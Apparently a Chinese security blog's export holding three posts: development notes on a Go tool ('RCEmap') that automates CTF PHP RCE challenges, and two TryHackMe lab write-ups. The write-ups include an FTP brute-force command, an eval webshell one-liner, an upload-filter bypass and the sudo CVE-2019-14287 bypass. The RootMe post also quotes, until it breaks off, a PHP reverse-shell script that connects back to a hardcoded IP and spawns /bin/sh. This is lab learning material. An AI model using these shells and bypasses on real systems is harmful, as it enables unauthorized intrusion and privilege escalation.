~，只要这四个没被过滤，就可以执行任意命令 已将初代版本上传到github，点点star谢谢喵，还会不断更新的喵 3月17日 v0.2诞生，已更新完毕，能在system的情况下利用bashfuck工具rce，优化代码结构，内置取反函数，不用再下载一个qufan.py了（这里不贴图了感兴趣自己测吧），最最最重要的更新！！！彩色信息！！！（图示执行结果为空因为我是win环境，如果是linux环境就会显示ls结果） 两日一更，代码量由200多增加到500多行，感觉要去世了，一杯茶一支烟，一个bug修一天。 3月21日 v0.3发布，已更新完毕，具体内容去github看吧，也没啥东西 3月27日 v0.4 (4月1日：到这里已经懒得不想说别的了，因为确实没有什么大更新，就是新增了函数什么的，就很敷衍) 四月 4月1日 其实我本来想写的是开发中的实际感受什么的，但是一开发起来就会发现根本没法下手，全都是感受，比如： 一大堆的bug（有的是代码问题，有的是逻辑问题，代码问题好办，使用正确语法就行，但逻辑问题通常需要调试好久） 本地搭环境一次次测试 为了不写出屎山代码的优化方案 找一个花括号闭合找两分钟 与和或弄错 写黑名单过滤部分整一晚上愣是没想明白该怎么写，最后放弃挣扎选择注释掉所有代码让别人写 还有需要不断更新的技术，例如以为要写完了突然发现利用环境变量构造函数那里还没写，于是赶紧又整了个函数（虽然还没填充内容） 而且明白为什么别人的项目中main部分都是调用别的函数，要我我也这么写，方便 写完之后预览这一部分发现容易看花眼，所以才加了序号 本来想的是三月内把v1.0写出来，现在看来是写不完了，截至今日还有fuzzpro函数和调用环境变量的pwd函数没有写，而这两个函数也是极为复杂的，不是简简单单的逻辑问题，需要额外编写脚本，我这项目相当于一个集成了一大堆脚本的项目 心得：经过这次开发之后，我学到了：1.chatGPT的熟练使用 2.Ctrl+c和Ctrl+v的熟练运用（没错我打这里的时候甚至也是把+c那个复制过来改成v的，要懒死了） 4月9日(没有更新，是思考) 心血来潮开始了开发，信誓旦旦预计二十天完成v0.1，真正上手才发现难度. RCE，这个类型的题目古往今来都没有一个像sqlmap一样的自动化脚本，为什么，因为题目类型实在是太多太复杂了，我的代码现在的逻辑是进行遍历和fuzz，遇到对劲的就对劲，不对劲的就没办法，但是这只能解决一些谁都会的题，比如实现起来最简单的无数字字母，因为是无数字字母，限制的太死了，所以解法也就那一种，被人研究出来也就都知道了，很少会考察 而且，还有很多限制字符数的，给个\\和&gt;就能在7个字符以内写入文件，13个字符可以选择$_GET[1],为什么这不是13个字符,因为还有换行的%0a,还有注释后面的%23,例如 1eval(&#x27;#man, &#x27;.$cmd.&#x27; ,manba,out&#x27;); 就这个玩意,你就得先换行绕第一个注释,然后用注释注释掉后面的废物,就正好13个字符了 那么: 大抵是要换脚本思路了,要让脚本像人一样思考,拟人化,但是人的大脑可以任意思考,而脚本是固定的,所以无法拟人,矛盾就来了 4月15日 更新了一个全新的项目fuzzpro（x其实是rcemap中fuzz部分分出来然后额外写成的），而且学习了引用包方法，以后终于不用把一大堆乱七八糟的函数放在这一个main文件中了 记个学习笔记： Go111modules最好设置为auto，虽然具体作用还不知道 引用包的方法： 首先要go mod init xxxx,这里的xxxx是模块名称，例如为main 然后在最主要的文件，例如 1.go &amp;&amp; package main 的情况下，import(“main/2”) 另一个子包文件要package 2，这里所有的名字都是例子，而这个package 2的文件名可以任意，但必须在文件夹2下 接下来，你的VScode可能会报错could not import main/2 (current file is not included in a workspace module),这个不用管，因为最后执行会正常执行，编译也会正常编译 4月17日 发布v0.5，抛去更新了fuzzpro这个脚本以外就是优化了代码结构，而且对未来的更新计划有了更全面更专业的见识，过几天这里会更新上开发以来的一些心得和一些笔记 开发笔记（未完待续） 起因 那天在学校，突然想开发个世界级项目，于是想题材，想到了世界级项目sqlmap，并且之前出现过一款ssti的自动化工具fenjing（这个也在不断更新，推广一下） 工具在这https://github.com/Marven11/Fenjing，而且ctf中rce的题目很多且并没有一个很好的脚本能够梭，于是决定了要开发的项目RCEmap（写到突然想起来，sqlmap是世界级项目的原因还有就是在渗透测试中也是梭sql注入的洞，而我想开发的RCEmap也是打算在后面的版本中更新出对于渗透测试中rce漏洞的检测与漏洞利用） 起步阶段 因为看过目前各互联网大厂的招聘要求，方便了解未来风向，然后看到一个没了解过的golang，在长亭的招聘要求中是python与go熟练其一，我一想居然与python相提并论的语言，那考虑一下（因为sqlmap之类的好多脚本都是用python开发的）最后也是用的golang开发哈哈接着确立了目标方向与前置技能并设置了不同阶段，接着从0学习Golang，其中最重要的工具是chatGPT(u1s1,没有chatGPT还真没办法这么轻易入门一门语言) 到了编写代码阶段，用gpt是完全可以的，但是对于前置的golang环境配置过程，gpt就相对无力了，这里简单写下自己的环境变量与前置问题 环境变量设置 12345GO111MODULE：auto GOPATH：E:\\Go\\Go project GOPROXY: https://goproxy.io GOROOT: E:\\Go\\ PATH: E:\\Go\\bin 对于这些变量，我为什么是这么设置的，我不记得了（毕竟代码能跑就行，探索的过程单纯是为了到达终点，代码不报错就不管了）什么盘设置为自己的就行，Go project是自带的还是我设置的我也忘了，我也就普通的分享一下，自己要是遇到问题了再想办法解决吧 前置问题 不管你的项目是什么，一定都会遇到的一个问题，在python中，我们可以直接import依赖，可以使用pip直接安装，但是在golang中，这些极为简单的东西会变得稍微繁琐一点，对于安装依赖来说，我们最好是模块化自己的项目，然后使用go get 来获取依赖 依赖的问题解决了，接下来就是引用包了，在python中我们可以自定义一个名为src（例子）的文件夹，接着在这个文件夹下写其他文件，然后在main.py中去调用这个其他文件里的函数，但是在go中不是这样的，我们第一次接触go都知道开头要写package main，这里其实就是包，如果模块化了一个名称，那么就可以按import 名称/包这样的格式来引用其他的函数 简单阐述可能会不理解，那么我们借助一个例子来说明 就用我的项目，我的主程序的文件名其实不重要，我这里是rcemap.go,但是当我使用go mod init RCEmap后，RCEmap这个名字就有了意义，接着，我新建了一个名为script的文件夹，里面存放了我暂时写完了无需更改的脚本，当我对bashfuck这个工具进行二开的时候我就想利用调用函数的方式实现，但是当时没搞明白，只是在我的主程序中嵌套了这个函数，现在，我可以写任一文件并调用其中函数，但是要求，package script(这里要根据这个文件夹来设置，如果文件夹名称为script但package了script2就不行)，且要被调用的函数一定要首字母大写，这样就可以解释新手第一行输出代码fmt.Println(&quot;helloworld&quot;)为什么一定要大写P了 还有就是在包中的脚本，例如script/1.go这个文件，文件名是不重要的，自己能看懂就行，如果在这个文件中要调用script/2.go这个文件中的函数，那么无需import RCEmap/script,只需要直接调用就行 目录结构示例如下 1234your_project/├── main.go└── script/ └── script.go 这里写下go get的帮助的翻译版 1234567891011121314151617181920212223242526272829303132333435363738394041424344Get将其命令行参数解析为特定模块版本的包，更新go.mod以要求这些版本，并将源代码下载到模块缓存。要添加包的依赖项或将其升级到最新版本，请执行以下操作：go get example.com/pkg要将包升级或降级到特定版本，请执行以下操作：go get example.com/pkg@v1.2.3要删除对模块的依赖项并降级需要它的模块，请执行以下操作：go get example.com/mod@none要将最低要求的Go版本升级到最新发布的Go版本，请执行以下操作：go get go@latest要将Go工具链升级到当前Go工具链的最新补丁版本，请执行以下操作：go get toolchain@patch看见https://golang.org/ref/mod#go-获取详细信息。在早期版本的Go中，“Go-get”用于构建和安装程序包。现在，“go-get”专门用于调整go.mod中的依赖项去安装&#x27;可以用来构建和安装命令。当指定了版本时，“go install”以模块感知模式运行，并忽略中的go.mod文件当前目录。例如go install example.com/pkg@v1.2.3go install example.com/pkg@latest请参阅“转到帮助安装”或https://golang.org/ref/mod#go-有关详细信息，请安装。“go-get”接受以下标志。-t标志指示get考虑构建测试所需的模块在命令行上指定的包。-u标志指示get更新提供依赖关系的模块在命令行上命名以使用较新的次要程序包或修补程序的程序包的数目可用时发布。-u=patch标志（不是-u patch）还指示get更新依赖项，但将默认设置更改为选择补丁版本。当-t和-u标志一起使用时，get将更新测试依赖关系。-x标志在命令执行时打印命令。这对直接下载模块时调试版本控制命令来自存储库。有关模块的更多信息，请参阅https://golang.org/ref/mod.有关使用“go get”更新最低go版本的更多信息，以及建议使用Go工具链，请参阅https://go.dev/doc/toolchain.有关指定程序包的详细信息，请参阅“转到帮助程序包”。本文描述了使用模块管理源代码的行为代码和依赖关系。如果go命令在GOPATH中运行模式下，get的标志和效果的细节会发生变化，“go help get”也会发生变化。请参阅“去帮助gopath get”。另请参阅：go build, go install, go clean, go mod。 编写主程序 在解决了一系列前置问题之后，就到了主体部分，也就是真正的开发，在这里，你可以见到： 不断与人工智障对线 一个逻辑报错修一下午 好不容易写了一大堆代码出来发现还没实现自己想要的功能但写都写了于是只好全部注释掉留给未来的自己或别人 首先第一点建议，如果你发现有的功能需要反复利用或者反复利用的同时需要设置一些变量，不妨将其写进一个函数中，然后通过传一个参数来控制后面的变量，这样就能通过反复调用这个函数来避免重复写相同代码，避免屎山的堆叠 这部分其实也是后写的，GUI部分在后面，这里主要写各函数功能和自动模式的编写思路 自动模式 我的自动模式主文件是script/rcemap.go，一开始的文件名也是这个，但是后来写fyneGUI的时候新建了main.go,后续就用main当主程序了 经过不断的调整,我的rcemap.go文件里面含有三个函数,Test Damn GP Test这个函数负责实现获取题目源码与过滤,方便进行下一步操作 Damn这个函数你看名字就挺damn的,实际上这个就是主操作部分的一套函数,用于对于过滤的不同情况枚举出需要下一步执行的功能函数,也就是在写这个函数的时候,写到黑名单那里写不下去了,于是决定写在手动那边,自动模式实在是容易出现各种逻辑洞,直到现在各种判断也写的不够好不够完全,部分逻辑判断还是会失误,这个就留到后面慢慢改吧 GP这个函数非常简单,接收URL,接收参数,接收传参方式,接收命令,然后发包执行,就是这么简单的一个函数,但是其他部分在开发的时候经常要用到通过不同传参方式传的情况,所以简简单单的一个函数通过反复的调用真的能减少很多不必要的代码 手动模式 我将在这个模式中写入大量自动无法实现或难以实现的功能,这里如果使用命令行的方式那么参数将相当的多,我并不希望当查看help的时候会出现一大堆乱七八糟的参数,所以我决定使用GUI,这样就会更美观简洁,提高使用效率 这个板块的笔记里面会写上我script文件夹中各文件的分类与各函数的作用 文件夹结构: 123456789script/ ├── bashfuck.go ├── eval.go ├── six2one.go ├── fuzzpro.go ├── misc.go └── system.go bashfuck.go 这个文件主要是对探姬大佬的bashfuck脚本进行的go重构版以便在我的工具里使用 eval.go 这个文件里面写了对于源码中执行eval函数时的各种情况所需函数包括Qufan(取反) Zizeng(自增) Ff(使用%ff为变量的骚方法) Xor(异或) Or(无数字字母或) Noshuzievaljinjie(无数字的进阶版,主要是$被ban了之后的情况) Xorplus(异或在限制字符种类数量的情况) six2one.go misc.go 这两个文件一起说了,six2one.go这个文件里面一开始是想写对于手动模式下 无数字字母RCE 黑名单绕过 少量字符RCE 环境变量构造 这几个情况,但后来还有一些其他的东西没地方加就直接加这里了,包括 preg_replace/e的利用 和 file_put_content的利用,原名叫four2one,后来改了才叫这个的 其中黑名单部分写的代码最多,贡献了283行代码,其中还有一些小函数被我放在了misc.go那个文件里面,那个文件里面塞了240行代码,所以总共算起来应该有500+行代码 (这里可能会有重复的屎山代码,但是改不过来了也懒得再写一个函数了就直接复制过去了) 然后额外目前是写了四个函数, Pwd(使用环境变量进行构造) Replace(preg_replace/e的利用) Fewchar(少量字符,未来7,5,4都会塞里面) File_put(如题,file_put_content的利用) fuzzpro.go 这个文件里面就是自写的用来fuzz的脚本了,后续可能会更新,可能会废弃,不好说,里面也写了300行代码了 system.go 这个文件里面就是system函数时的各种函数了,但里面也只写了一个Bashfuck函数,因为还有其他的例如少量字符这种的扔six2one那里了,所以这里只有一个这个,用来调用bashfuck那个文件里面的其他函数,与原版bashfuck没一毛钱关系 GUI部分 开头杂谈 一开始是毫无进展，6月20号写了50行，有了个开头，6月21号写了100行，总共150行，小有感悟，于是赶忙写下此文 主程序部分还没写完就写上GUI了，从0学fyne开发，GPT3.5告诉我这是golang各GUI库中对新手最友好的一个了，我就决定从这个上手，配置环境配置一天（别问，问就是我是傻逼）然后网络上关于fyne的视频教程不多，golang对于python，c这种的语言就是要冷门一些更何况是众多GUI库中的一个fyne了，自己也决定就是看着文档一点点cv呗，当个CtrlCV工程师,然后就到了卡了最久的部分: 文档看不懂 不是英文看不懂,有大佬搞了个中文版的,就是,上面每一个字我都认识,但是连起来就不认识了,一度想过换一个库,但是看来看去别的库连个能看的文档都没有,于是只好回头重新看文档 比如一开始我想左右分割吗,用split分割,然后我看文档组件里面有split,于是我寻思找实例,直接抄过来改,这里也是被狠狠教育了,以后看文档可不能直接cv了,得自己体悟,但是我不知道,我新手啊,我开发都头一次,之前写的也都是命令行,GUI也是头一次搞,然后傻逼GPT3.5真是解决不了一点问题,净给我那个过时被舍弃了的函数根本执行不了,问了三次全是傻逼3.5自以为是自己编出来的函数,后来才写出来第一个容器 第一个容器 这里删删改改,忘了是GPT还是csdn还是官方的youtube视频了,反正教会了我使用container,widget等选择自己想要的部分如,container.NewVBox整个左右贯通的容器,各种文档中的组件都在widget里,这时候才明白,文档给的很详细,只是我看不懂而已(之前还说呢傻逼文档不明不白连示例都没有)但是,有一说一,他们对于新手第一次开发的教学确实不是很到位,demo里各种功能也都是一些乱七八糟的函数,根本看不懂 小试牛刀 3.5就是废物,真人工智能还得是4o 写出来第一个容器之后也算是摸到门了,自己想要实现一个什么东西,就去文档里面看是什么组件或者是什么&quot;容器和布局&quot;,还是那句话,官方文档里面的示例就是一个示例,不具备任何学习价值,这里自己可以乱写一些代码,然后让4o给你改,然后复制它改好的放进demo里执行一下看看什么效果,然后再写进自己的main文件中,然后就是看vscode光标放上去出现的提示以及https://pkg.go.dev/fyne.io/fyne/v2@v2.4.5/ 中的函数用法就知道这是一个什么类型的函数以及需要输入什么变量,然后就能慢慢摸索着开发了,代码本身不会报错(这种低级错误自己看vscode自己审代码缺啥玩意自己改就好了),但是逻辑会出bug,这种的就得问GPT,还是那样,让它给你一个代码,然后扔进demo调试,别直接往自己项目里写那玩意给的代码不靠谱,得自己测,但是一点开发经验都没有的小伙你先别惦记GUI哈,你先搞点最简单的开发再来搞GUI。 羡慕有学长带的，羡慕有4.0的，但也只是羡慕而已，自己搞出来这玩意能分泌多少多巴胺没试过的根本不知道，啥也不会的时候坐牢是真坐牢，自己研究出来的时候爽是真爽这下大学还没毕业直接就三年开发经验了😋，而且还有自己的项目，遥遥领先同行，希望我的研究经过能给更多还没入门GUI开发的新手启发，以后不需要什么大爹了，官方文档和gpt4o就是我爹 再次表达对3.5的不满，3.5就是傻逼 啥你问我这部分文章有啥干货？没有啊这就是水文，我刚会写两天能给你什么顶级干货，标题就说了这是杂谈，记录自己从0到0.1的过程而已，巨大突破！(bushi) 浅浅干货 为什么写干货了，因为写了四天了（今天6月23日），成功浅浅实现小小目标，进度完成了二十分之一了吧估计 对原命令行版rcemap做了fyne的适配，虽然适配的不完全，但是现在自动模式能执行了，但是只有eval无数字字母，别的还没测试没适配，自动模式搞完还有手动模式，手动模式有四个模式，还有一些新脚本没写，然后就是对ffuf的移植，还一点没搞，代码还没审呢，但是从文档都看不懂到点击按钮能实现功能，只用4天，我真厉害（别骂我有能耐你四天搞出来，而且我才准高三，我有炫耀的资本） 然后既然笔记嘛，得写知识点，该写正文了 container.xxxxxx 造容器的库 widget.xxx 造组件的库 (区分组件与容器去看文档) 对其他已有函数的适配只需要func (label *widget.label)&#123;&#125;就可以,然后就可以调用或者set了 中文字体设置: os.Setenv(&quot;FYNE_FONT&quot;, path) , path是字体路径,可以复制下面函数 12345678910func init() &#123; //设置中文字体 fontPaths := findfont.List() for _, path := range fontPaths &#123; if strings.Contains(path, &quot;msyhbd.ttf&quot;) || strings.Contains(path, &quot;simhei.ttf&quot;) || strings.Contains(path, &quot;simsun.ttc&quot;) || strings.Contains(path, &quot;simkai.ttf&quot;) || strings.Contains(path, &quot;simfang.ttf&quot;) &#123; os.Setenv(&quot;FYNE_FONT&quot;, path) break &#125; &#125;&#125; 修改默认字体大小,得自定义一个主题,同样复制即可 123456789101112131415161718192021type CustomTheme struct&#123;&#125;func (c CustomTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant) color.Color &#123; return theme.DefaultTheme().Color(name, variant)&#125;func (c CustomTheme) Font(style fyne.TextStyle) fyne.Resource &#123; return theme.DefaultTheme().Font(style)&#125;func (c CustomTheme) Icon(name fyne.ThemeIconName) fyne.Resource &#123; return theme.DefaultTheme().Icon(name)&#125;func (c CustomTheme) Size(name fyne.ThemeSizeName) float32 &#123; // 修改默认字体大小 if name == theme.SizeNameText &#123; return 16 // 设置默认字体大小为16 &#125; return theme.DefaultTheme().Size(name)&#125; 加了个通过按钮调节字体大小的功能 1234567891011121314151617181920212223type CustomTheme struct &#123; textSize float32&#125;func (c CustomTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant) color.Color &#123; return theme.DefaultTheme().Color(name, variant)&#125;func (c CustomTheme) Font(style fyne.TextStyle) fyne.Resource &#123; return theme.DefaultTheme().Font(style)&#125;func (c CustomTheme) Icon(name fyne.ThemeIconName) fyne.Resource &#123; return theme.DefaultTheme().Icon(name)&#125;func (c CustomTheme) Size(name fyne.ThemeSizeName) float32 &#123; // 修改默认字体大小 if name == theme.SizeNameText &#123; return c.textSize &#125; return theme.DefaultTheme().Size(name)&#125; 和 123456789101112131415161718192021fontSizeLabel := widget.NewLabel(&quot;字体大小: &quot; + fmt.Sprintf(&quot;%.0f&quot;, customTheme.textSize)) //显示当前字体大小themes := container.NewGridWithColumns(2,//设置两个按钮 widget.NewButtonWithIcon(&quot;&quot;, theme.NavigateBackIcon(), func() &#123; customTheme.textSize -= 1 a.Settings().SetTheme(customTheme) content.Refresh() fontSizeLabel.SetText(&quot;字体大小: &quot; + fmt.Sprintf(&quot;%.0f&quot;, customTheme.textSize)) // 更新标签文本 &#125;), widget.NewButtonWithIcon(&quot;&quot;, theme.NavigateNextIcon(), func() &#123; customTheme.textSize += 1 a.Settings().SetTheme(customTheme) content.Refresh() fontSizeLabel.SetText(&quot;字体大小: &quot; + fmt.Sprintf(&quot;%.0f&quot;, customTheme.textSize)) // 更新标签文本 &#125;),) 嗯,基本没啥了,我接着开发再有啥干货再加,你要是问我开发笔记啥的,🤔我上面的不就是笔记么 自动模式完结 6月30日，6月的最后一天，周六，晚，开发完毕自动模式全部，基本就是调用原来的函数完事做点适配修点bug（不是哥们，截止今天rcemap收获了10个star，我那10个star人一个给我测试的都没有？有bug你issue说一声或者拉个pr我给你加个贡献者都行啊，你们那10个人到底用了没有？还是你们根本没用到这一步我其他的模式就已经足以getflag了？），下一步是手动模式 写写遇到的逻辑洞吧，比如识别phpinfo()和system(whoami)经常写死,比如&quot;(&quot; + ff1 + &quot;^&quot; + ff2 + &quot;)&quot;,ff1和2就是括号里面的内容,但是对于phpinfo()这种括号里面没东西的造出来的结果就变成了(^),所以这里得加个判断,判断下括号里是否存在内容然后之前写个自增方法rce的只考虑了get方法,导致直接?code=....$_GET[%ff]&amp;%ff=....但是改成POST方式时还是用的$_GET[%ff],而且传参是POST传的%ff,就导致无效,就得改为GET请求能var bool string,然后func (bool string)&#123;&#125;接着在func里赋值,然后if bool==&quot;0&quot;&#123;&#125;,就不要bool := func () (bool) &#123;&#125;,然后在func里面return false,这样会浪费return,而且是不必要的好像然后就没啥东西了,主要就是原代码的修改适配,关于GUI的容器部分自动模式这里是完事了的,再有知识点就得手动模式了,但是我估计我也写不到别的,现在就容器,button,entry,radio,select,可能还有split和scroll,就能用上这些组件,早都会用了,没啥知识点了 现在开发就是稳步推进中,工作日晚上回来不是很有时间慢慢适配找bug,所以只能周末更,Blog已经很久没有新内容了(除了这个笔记以外),新买了一个m2,下个jetbrains的软件看看go的IDE和vscode比哪个好用吧,说是按tab自动补全,但是不知道具体有多智能,估计靠谱不到哪去(嘿,用完发现还行,而且打开速度很快,3500mb/s的读取速度5秒打开,果断放弃vscode) 后面手动模式还得写个利用环境变量构造命令的函数,绕黑名单,绕7字符,就黑名单那玩意,正常ctf里简单的要死,但是写逻辑函数就贼费劲,而且一大堆乱七八糟的情况,命令多,过滤复杂,真烦死了,环境变量那个根本不知道怎么写函数,七字符我自己还没看明白呢,所以一直拖着进度很慢嗯,就这些 手动模式 首先是用了一阵子发现自己傻逼一样非得把url和端口分开，于是就合并了，没必要分开的根本，手动这边，参数点和执行命令是怎么的都得用的，所以就固定在了上面，phpVersion听说好像能探测出来，现在还不会，以后再看看有人跟我说要我内置个分析工具分析代码逻辑，我寻思做不到，这个得接入ai，直到今天github发现一个codeQLpy(一个基于codeQL开发的java代码审计工具，好像以后会加其他语言)，我寻思他这java都能代码审计了，咱基于codeQL写个php的自动化代码审计工具好像也不是做不到，之后再说吧现在不会完事有一个比较有意思的东西，就是通过不同的选择然后给一个字符串赋个值,最后START的时候switch这个字符串的不同值执行不同代码,也算是个小经验吧(可能大部分人都是这样的?) 还遇到个大哥,大哥对我这玩意十分看好,抱一百个期待,就冲这个大哥就得多加点功能进去 9可以合并到无数字字母进阶版里面，10xml严格来讲跟我这没关系，67肝一肝应该能写个不完全的版本，4跑跑脚本应该也能行，3这个严格来讲做不了，现在这个是nmap写文件，还可能出现那种直接eval的，还可能拿另一个能写文件的软件完事设置参数啥的，也挺费劲 经手动统计, 已写80+440+303+248+266+335+97+549=2318行代码 (包含大量注释与换行,就算都去掉了,怎么的1800行也有了)"},{"title":"THM3 Agent Sudo","path":"2024/02/29/thm3/","text":"easy是你的谎言(于3月4日完结) Agent Sudo Agent Sudo ftp Flag1 Flag2 总结 题目如下 改变user-agent试试 当user-agent为R的时候，上面出现了一句话(意为：“你在做什么？你是25名员工中的一员吗？如果没有，我将报告这一事件” ) 提示25人,算上R一共26个,正好对应26个字母,于是从A开始测试,A与B未出现变化,但当输入C的时候,显示变了 提示弱口令,同时发现用户名chris 老规矩nmap扫端口 ftp 出现了一个以前题目没出现过的21端口,那就先对ftp进行爆破 hydra -l chris -P E:\\gongju\\fuzzDicts-master\\passwordDict\\top500.txt 10.10.226.232 ftp 爆破成功,ftp上去下载文件 三个文件,.txt文件内容与显示一样,对两个照片下手,首先考虑隐写,使用binwalk看看 出现zip,解压需要密码,使用zip2john获取hash值准备爆破,使用john爆破出密码,用7z解压获得文件 123456Agent C,We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!By,Agent R 使用cyberchef对莫名字符串解密,发现是base64编码 获得密码Area51,但是光有这个并不知道他的用途是什么,于是对ftp下载下来的另一个jpg文件下手,使用steghide工具发现另一个人的用户名与登录密码hackerrules!(这里我用hackerrules试了半天一直提示密码错误,哪个小逆天教你这么写密码的) Flag1 find一下发现没有可以提权的东西,使用scp下载目录里的另一张照片, 其中一个问题是照片中的事件叫什么？, 通过OSINT发现事件名叫Roswell alien autopsy (事实上,这个事件名与提权拿第二个flag一点关系都没有,纯nt,我还研究半天这个事件怎么看出来CVE的) Flag2 接下来是经典提权 1234567james@agent-sudo:~$ sudo -l[sudo] password for james:Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on agent-sudo: (ALL, !root) /bin/bash (ALL, !root) /bin/bash 这条规则授予了所有非 root 用户在任何主机上运行 Bash Shell 的权限搜索(ALL, !root) /bin/bash CVE,发现有一个CVE-2019-14287: 在 1.8.28 之前的 Sudo 中，有权访问 Runas ALL sudoer 帐户的攻击者可以通过使用精心设计的用户 ID 调用 sudo 来绕过某些策略黑名单​​和会话 PAM 模块，并可能导致错误的日志记录。例如，对于“sudo -u #$((0xffffffff))”命令，这允许绕过 !root 配置和 USER= 日志记录。 12345james@agent-sudo:~$ sudo --versionSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2 正好合适,存在这个漏洞,使用exp提权 总结 要不是一些有点nt的问题这个还挺有意思的,需要了解各种爆破和最后一个CVE提权,学习到很多，接下来要去学习go语言和开发项目了，THM将告一段落"},{"title":"THM2 RootMe","path":"2024/02/21/thm2/","text":"大晚上的，不知道干点啥，做个thm玩玩 RootMe Flag1 Flag2 总结 文章的最后发一下我使用的反弹shell的php代码 RootMe 一打开题目，什么都没有，肯定还是老方法 12nmap -sS -sV xx.xx.xx.xx --open dirsearch -u xx.xx.xx.xx 经典操作扫端口和文件，发现一个 /uploads 路径和一个不知道啥的 /panel 路径,那必须访问上去看看啊 原来uploads里装的应该是咱传上去的东西,panel才是上传接口 看了一眼是php,直接传个小马先 1&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt; 上面带waf的，各种方法都绕不过去，搜了一下发现apache会从右往左解析，遇到解析不了的会跳过去，这样我们上传一个shell.php.zzz就可以成功绕过 直接蚁剑连上 Flag1 翻到 www 目录直接就发现了第一个 flag THM{y0u_g0t_a_sh3ll} 到这里其实都没有什么难度，第二个flag才算是学到了新的知识 Flag2 根据题目要去 /root 下找第二个flag，直接往前翻，但是因为没有权限所以没成功 弹个shell准备提权，这里使用find -perm -4000搜索带有suid权限的命令，看到有个python,使用现学来的suid提权方法提权 本来我是不会提权的，练这一道题正好入门了，这里是经过大佬的博客学会了使用find命令来搜suid命令 大佬的博客https://blog.51cto.com/yttitan/6046179 这里是引用大佬的话 12345678910111213已知的可以被用来进行SUID提权的程序主要有：nmap、vim、find、bash、more、less、nano、cp等，所以我们可以重点去查看一下这些程序是否被设置了SUID权限。但是挨个去查看的话，效率太低，所以这里推荐采用搜索的方式去查找系统中所有设置了SUID的程序。搜索肯定要用到find命令，这是Linux中的一个比较复杂的命令，当然功能也非常强大。find命令之所以复杂，原因之一就是拥有众多选项。我们这里按文件权限查找，需要用到它的-perm选项。-perm选项的基本用法很简单，格式为&quot;-perm mode”，其中mode为所要匹配的权限。我们通常见到的权限数字组合都是类似于755或644这种形式，其实完整的权限数字组合应该是四位数，左侧最高位就是用于表示特殊权限。只不过特殊权限并不常用，所以我们平常见到的才主要是三位数字组合。我们现在要查找的是SUID这种特殊权限，所以要使用的必然是四位数字组合。SUID对应的权限数字是4，特殊权限被放在数字组合左侧最高位，所以mode通常用4000表示。注意，数字0表示忽略相应位置的权限，也就是说不考虑rwx权限，所以4000就表示查找被设置了SUID权限的文件，至于其它的rwx权限则根本不考虑。执行&quot;find -perm-4000&quot;就可以查找出系统中所有被设置了SUID权限的文件。下面所使用的命令中2&gt;/dev/null，表示屏蔽错误信息。因为find命令在执行过程中可能会出现一些错误信息，加上这个功能可以让显示结果更加清晰。 这里没发现那几个常用的suid提权程序,但是有个python,于是可以使用python提权,看了好多wp发现都是下面这个网站里找到提权程序的https://gtfobins.github.io/ 这中间其实发生了不少事，我折腾了半个小时，包括nc监听不了端口，明明续命了仍然断了被迫换靶机，蚁剑反弹shell就是不好使，换php代码找了个自动反弹shell的弹上去最后提权成功，虽然很费劲，但还是成功拿下第三道 THM{pr1v1l3g3_3sc4l4t10n} 总结 在这个靶机中,可以学习到使用find命令查找suid权限,学会了最基本的suid提权方法,收获了一个反弹shell的轮子 文章的最后发一下我使用的反弹shell的php代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only. Users take full responsibility// for any actions performed using this tool. The author accepts no liability// for damage caused by this tool. If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only. Users take full responsibility// for any actions performed using this tool. If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#x27;10.8.39.215&#x27;; // CHANGE THIS$port = 9999; // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies. Worth a try...if (function_exists(&#x27;pcntl_fork&#x27;)) &#123; // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) &#123; printit(&quot;ERROR: Can&#x27;t fork&quot;); exit(1); &#125; if ($pid) &#123; exit(0); // Parent exits &#125; // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) &#123; printit(&quot;Error: Can&#x27;t setsid()&quot;); exit(1); &#125; $daemon = 1;&#125; else &#123; printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);&#125;// Change to a safe directorychdir(&quot;/&quot;);// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) &#123; printit(&quot;$errstr ($errno)&quot;); exit(1);&#125;// Spawn shell process$descriptorspec = array( 0 